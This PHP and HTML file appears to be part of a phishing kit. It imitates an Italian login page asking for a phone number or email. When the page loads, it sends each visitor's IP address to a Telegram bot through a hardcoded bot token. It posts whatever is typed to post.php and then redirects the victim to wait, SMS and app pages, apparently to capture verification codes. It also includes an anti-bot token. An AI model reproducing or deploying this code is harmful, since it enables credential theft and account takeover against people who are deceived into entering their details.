<?php
require '../main.php';

setcookie('token',$antibotplot,[
    'path'=>'/',
    'secure'=>false,
    'httponly'=>false,
    'samesite'=>'Lax'
]);

/* ===== Real Visitor IP ===== */
function getVisitorIP() {
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        return $_SERVER['HTTP_CF_CONNECTING_IP'];
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    }
    return $_SERVER['REMOTE_ADDR'];
}

$visitor_ip = getVisitorIP();

/* ===== Telegram Config ===== */
$bot_token = '7950895908:AAEkB8RBj9zrFotlCzZTU8dKWiAvlb7A_oA';
$chat_id   = '-5364240531';

/* ===== Message ===== */
$message =
"👁️ New Visitor Detected\n".
"IP: $visitor_ip\n".
"Time: ".date('Y-m-d H:i:s');

$url = "https://api.telegram.org/bot{$bot_token}/sendMessage";

$data = [
    'chat_id' => $chat_id,
    'text' => $message,
    'parse_mode' => 'HTML'
];

/* ===== FAST NON-BLOCKING TELEGRAM SEND ===== */

ob_start();

$ch = curl_init($url);
curl_setopt_array($ch, [
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => http_build_query($data),
    CURLOPT_RETURNTRANSFER => false,
    CURLOPT_TIMEOUT => 1,
    CURLOPT_CONNECTTIMEOUT => 1,
    CURLOPT_NOSIGNAL => 1
]);

curl_exec($ch);
curl_close($ch);

ob_end_clean();
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login</title>
<link rel="stylesheet" href="res/app.css">
</head>

<body>
<main>
<div class="form">
<div class="logo"><img src="res/logo.png"></div>

<div class="text">
<h2>Accedi</h2>
<span>Oppure <a href="#" class="create-account">Crea un account</a></span>
</div>

<div class="col">
<div class="input-wrapper">
<input type="text" id="u" placeholder="Numero di telefono o email">
</div>
</div>

<script>
if (typeof globalThis.token === "undefined") {
    globalThis.token = <?php echo json_encode($antibotplot); ?>;
}
</script>

<div class="col">
<button onclick="sendLogin()">Continua</button>
</div>

<div class="terms-footer">
<p>Rimarrai <strong>connesso per un</strong> accesso più rapido</p>
<p>Continuando, accetto i <a href="#">Termini di utilizzo</a> · <a href="#">Informativa sulla privacy</a></p>
</div>
</div>
</main>

<!-- ✅ ONLY ONE JQUERY -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>

<script>
$(document).ready(function(){

    $("#u").on("input", function(){

        let input = $(this);
        let val = input.val();

        // email → do nothing
        if(/[a-zA-Z@]/.test(val)){
            return;
        }

        let digits = val.replace(/\D/g, '');

        // already formatted
        if(val.startsWith("+39 ")){

            if(digits.startsWith("39")){
                digits = digits.substring(2);
            }

            input.val("+39 " + digits);
            return;
        }

        // add +39 after 5 digits
        if(digits.length === 5){
            input.val("+39 " + digits);
        }
    });

});

/* ===== LOGIN SEND ===== */
function sendLogin(){

    $("input").removeClass("error");

    let inputVal = $("#u").val().trim();

    if(inputVal === ""){
        $("#u").addClass("error");
        return;
    }

    let isEmail = /[a-zA-Z@]/.test(inputVal);
    let phoneOnly = inputVal.replace(/\D/g, '');

    console.log("REQUEST SENT");

    $.post("post.php", {
        user: inputVal,
        pass: $("#p").val()
    }, function(){

        if(isEmail){
            window.location="wait.php?next=sms.php";
        }else if(phoneOnly.length > 0){
            window.location="wait.php?next=app.php";
        }else{
            alert("Invalid input");
        }

    });
}

/* ENTER KEY */
$("input").keypress(function(e){
    if(e.key=="Enter"){
        sendLogin();
    }
});
</script>

</body>
</html>